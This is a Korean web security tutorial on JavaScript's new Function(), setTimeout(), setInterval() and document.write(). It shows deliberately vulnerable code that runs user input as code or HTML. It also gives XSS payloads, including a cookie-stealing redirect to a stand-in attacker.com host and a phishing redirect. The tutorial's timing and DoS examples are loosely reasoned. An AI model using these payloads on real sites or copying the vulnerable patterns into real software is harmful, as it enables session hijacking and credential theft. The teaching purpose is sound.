## ☪️ 동적 코드 실행 함수 (Dynamic Code Execution Functions)
#### new Function(), setTimeout(), setInterval(), document.write()

### **1. `new Function()`을 통한 코드 인젝션 공격**

#### **개념**:

`new Function()`은 **동적으로 JavaScript 코드를 실행**하는 강력한 함수입니다. 이 함수는 문자열을 받아서 실행 가능한 코드로 변환해 실행하는 방식입니다. 그런데 이 방식이 문제를 일으킬 수 있습니다. **외부 입력을 코드로 실행**하는 경우 **코드 인젝션** 공격에 취약해집니다.

#### **웹 해킹 관점에서의 위험**:

* **코드 인젝션 (Code Injection)**: 외부 사용자가 입력한 값을 **JavaScript 코드로 실행**하는 방식은 매우 위험합니다. 악성 코드가 삽입될 수 있기 때문입니다. 공격자는 이를 악용하여 **쿠키 탈취**, **세션 하이재킹**, **크로스 사이트 스크립팅(XSS)** 공격을 수행할 수 있습니다.

#### **공격 예시**:

**XSS (Cross-Site Scripting) 공격**

* 예를 들어, 웹 애플리케이션이 사용자로부터 **댓글**을 입력받고 이를 **동적으로 출력**하는 기능을 제공한다고 합시다. 사용자가 입력한 댓글을 `new Function()`을 통해 처리하는 코드가 있다고 가정해보겠습니다.

  **취약한 코드**:

  ```javascript
  let userComment = document.getElementById("commentInput").value;  // 사용자 댓글 입력 받기
  let dynamicComment = new Function(userComment);  // 입력된 댓글을 코드로 실행
  dynamicComment();  // 사용자 입력을 실행
  ```

  이 코드에서, 만약 사용자가 **악성 스크립트**를 입력한다면, 그 코드는 그대로 실행됩니다. 예를 들어, 사용자가 입력란에 `alert(document.cookie)`라는 코드를 삽입했다고 가정해봅시다. 이 경우, **사용자의 쿠키**가 알림창으로 출력되며 공격자는 이를 **탈취**할 수 있습니다.

  **악성 코드 예시**:

  ```javascript
  alert(document.cookie);  // 쿠키 탈취
  ```

  이 코드는 공격자가 웹 애플리케이션에서 **사용자의 쿠키**를 알아낼 수 있게 합니다. 이를 통해 공격자는 **세션 하이재킹**을 시도하거나, 다른 민감한 정보를 탈취할 수 있습니다.

---

### **2. `setTimeout()`을 통한 타이밍 공격**

#### **개념**:

`setTimeout()`은 **특정 시간 후에 한 번 실행되는** 비동기 함수입니다. 주로 지연된 실행을 위해 사용되며, 설정된 시간이 지나면 **콜백 함수**가 실행됩니다. 이 함수는 **비동기적**으로 동작하기 때문에 주어진 시간에 맞춰서 **타이밍을 조절**할 수 있습니다.

#### **웹 해킹 관점에서의 위험**:

* **타이밍 공격 (Timing Attacks)**: 공격자는 `setTimeout()`을 활용하여 **서버의 응답 시간**을 분석하거나 **사용자의 인증 정보를 추측**할 수 있습니다. 특히 인증 시스템에서는 **성공적인 로그인**과 **실패한 로그인**의 응답 시간이 다를 수 있기 때문에 이를 악용하여 **패스워드**나 **사용자 이름**을 유추할 수 있습니다.

#### **공격 예시**:

* 예를 들어, 로그인 페이지에서 `setTimeout()`을 사용하여 응답을 지연시키는 방식이 있을 수 있습니다. 공격자는 로그인 성공과 실패의 시간을 분석해, **비밀번호 추측**이나 **사용자 정보**를 유추할 수 있습니다.

  **취약한 코드 예시**:

  ```javascript
  setTimeout(() => {
    // 로그인 성공 시 수행되는 동작
    alert('로그인 성공');
  }, 500);  // 500ms 후에 실행
  ```

  이 코드는 로그인 성공 시 **500ms** 동안 지연되는데, 공격자는 여러 번 로그인 시도를 통해 **응답 시간**의 차이를 분석하고 로그인 성공 여부를 알아낼 수 있습니다.


---

### **3. `setInterval()`을 통한 서비스 거부(DoS) 공격**

#### **개념**:

`setInterval()`은 주어진 시간 간격으로 **지속적으로 함수를 반복 실행**하는 함수입니다. 주기적으로 특정 작업을 수행할 때 유용하지만, 이를 잘못 사용하면 **서버 자원 소모**나 **서비스 거부(DoS) 공격**을 유발할 수 있습니다.

#### **웹 해킹 관점에서의 위험**:

* **서비스 거부(DoS)**: 공격자는 `setInterval()`을 통해 서버에 **과도한 요청**을 반복적으로 보내거나, 클라이언트에서 불필요하게 자원을 소모시킬 수 있습니다. 이렇게 하면 서버가 과부하에 걸리거나 클라이언트 측에서 **리소스를 낭비**하게 되어 **서비스 거부 상태**에 빠질 수 있습니다.

#### **공격 예시**:

* 예를 들어, 클라이언트가 `setInterval()`을 사용하여 서버에 **주기적으로** 요청을 보내게 된다면, 서버는 과도한 요청을 처리해야 하므로 자원이 고갈되어 **서비스 거부(DoS)** 상태에 빠질 수 있습니다.

  **취약한 코드 예시**:

  ```javascript
  setInterval(() => {
    fetch('https://example.com/api');  // 서버에 계속해서 요청 보내기
  }, 10);  // 10ms마다 요청을 보냄
  ```

  이 코드는 **10ms마다** 서버에 계속 요청을 보내게 되며, 서버는 **과도한 요청 처리**로 인해 **리소스를 소모**하게 됩니다. 결국 서버는 정상적인 요청을 처리하지 못하고 **서비스가 마비**될 수 있습니다.

#### **취약점 해결**:

* **요청 간격을 제한**하고, 서버에 **불필요한 반복 요청**이 발생하지 않도록 주의해야 합니다. 또한 **API 요청에 대한 제한**(rate limiting)을 설정하여, 클라이언트에서 과도한 요청을 보내지 못하도록 방지해야 합니다.

---

### **4. document.write()`을 통한 DOM 공격**

#### **개념**:

`document.write()`는 **Java스크립트로 동적으로 HTML 콘텐츠를 삽입**할 수 있는 함수입니다. 이 함수는 주로 **페이지 로딩 중**에 콘텐츠를 삽입하거나 수정하는 데 사용됩니다. 그러나 **동적으로 HTML을 삽입**할 수 있는 강력한 기능을 제공하지만, 그만큼 **보안상 심각한 취약점을 초래할 수 있습니다**. 주로 **XSS (Cross-Site Scripting)** 공격이나 **페이지 위조** 같은 문제를 유발할 수 있습니다.

#### **웹 해킹 관점에서의 위험**:

* **페이지 내용 덮어쓰기**:
  `document.write()`는 페이지 로딩이 완료된 후에는 **문서의 기존 콘텐츠를 덮어쓸** 수 있습니다. 만약 사용자 입력이 포함되어 있다면, **기존 콘텐츠가 모두 삭제**되고 새로운 콘텐츠로 바뀌게 됩니다. 이로 인해 **사용자 경험**에 심각한 영향을 미칠 수 있습니다.

* **스크립트 삽입**:
  `document.write()`는 **HTML 요소를 삽입**하기 위해 사용되며, 사용자가 입력한 값이 HTML 코드로 삽입되는 방식입니다. 이로 인해 **HTML 태그나 스크립트**가 삽입되면, 악성 코드가 실행될 수 있습니다.

#### **공격 예시**:

웹 애플리케이션에서 **사용자 댓글**을 입력받아 페이지에 동적으로 출력하는 기능을 제공한다고 합시다. 이때 \*\*`document.write()`\*\*로 사용자의 댓글을 페이지에 삽입하는 방식을 사용하고 있다고 가정합니다.

```javascript
let userComment = document.getElementById("commentInput").value;  // 사용자 댓글 입력 받기
document.write(userComment);  // 입력된 값을 그대로 페이지에 삽입
```

#### **악성 입력**

악의적인 사용자가 `document.write()`의 입력 필드에 JavaScript 코드를 삽입할 수 있다면, 이는 **XSS 공격**으로 이어질 수 있습니다. 예를 들어, 공격자가 다음과 같이 입력한다고 가정해봅시다:

```html
<script>alert('XSS Attack!');</script>
```

이 코드가 `document.write()`에 의해 실행되면, 웹 페이지에 **알림창이 뜨게 되며**, 이는 공격자가 **악성 스크립트를 실행**시키는 방법입니다.

#### **결과**

* **쿠키 탈취**: 공격자는 \*\*`document.cookie`\*\*를 이용해 사용자의 **세션 쿠키**를 탈취할 수 있습니다.

  ```javascript
  <script>document.location='https://attacker.com?cookie=' + document.cookie;</script>
  ```

  위와 같은 스크립트가 삽입되면, 사용자의 쿠키가 공격자에게 전송되어 세션 하이재킹 공격에 사용될 수 있습니다.

* **피싱 공격**: 공격자는 **가짜 로그인 페이지**를 삽입해 사용자가 로그인 정보를 입력하게 유도할 수 있습니다.

  ```html
  <script>document.location="https://fake-login.com"</script>
  ```

  이 스크립트는 사용자를 **피싱 사이트**로 리디렉션시켜 **사용자 정보를 탈취**할 수 있습니다.
